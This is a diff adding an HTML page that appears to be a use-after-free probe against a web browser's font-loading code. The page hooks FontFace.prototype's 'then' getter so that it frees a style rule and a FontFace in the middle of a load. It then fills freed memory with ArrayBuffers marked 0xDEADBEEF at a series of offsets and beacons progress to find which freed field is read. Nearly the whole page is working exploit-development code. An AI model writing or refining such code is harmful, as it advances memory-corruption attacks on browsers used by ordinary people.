@@ -1,0 +1,50 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf53</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+/* one fresh face per offset; each arm poisons a single qword in every buffer.
+   The last SURVIVED before a death names the member the continuation reads. */
+var OFFS=[0x18,0x20,0x28,0x30,0x38,0x40,0x48,0x50];
+var K=16, SIZE=192, cur=-1, styleEl=null, fired=false, MAP=[];
+var U=Date.now().toString(36);
+function arm(i){
+  cur=i; fired=false;
+  if (styleEl) { styleEl.remove(); styleEl=null; }
+  var fam='s'+U+'x'+i, nm='f'+U+'x'+i;
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+"+ (0x42+i).toString(16).toUpperCase() +"; }";
+  document.head.appendChild(styleEl);
+  var A=new FontFace(nm,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded;
+  (window.__alive=window.__alive||[]).push(A);
+  b('U53-ARM-'+i+'-OFF-'+OFFS[i]+'-START');
+  document.fonts.load('1em '+nm+', '+fam, 'AB').then(function(){
+    b('U53-ARM-'+i+'-RESOLVED');
+    if (i+1<OFFS.length) setTimeout(function(){ arm(i+1); }, 60);
+    else b('U53-DONE-ALL');
+  }, function(){ b('U53-ARM-'+i+'-REJECTED'); if (i+1<OFFS.length) setTimeout(function(){ arm(i+1); }, 60); });
+}
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if (fired || cur<0) return undefined;
+    fired=true;
+    var off=OFFS[cur];
+    if (styleEl) styleEl.remove();
+    try { document.fonts.delete(this); } catch(e) {}
+    styleEl=null;
+    document.body.offsetHeight;
+    MAP=[];
+    for (var k=0;k<K;k++){
+      var u=new Uint8Array(new ArrayBuffer(SIZE));
+      u[off]=0xEF; u[off+1]=0xBE; u[off+2]=0xAD; u[off+3]=0xDE;
+      MAP.push(u);
+    }
+    try { document.fonts.check('1em s'+U+'x'+cur); } catch(e){}
+    b('U53-ARM-'+cur+'-CHECK-RETURNED');
+    return undefined;
+  }, set:function(){}
+});
+function run(){ b('U53-PARSE-'+U); arm(0); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>uaf51</p></body></html>
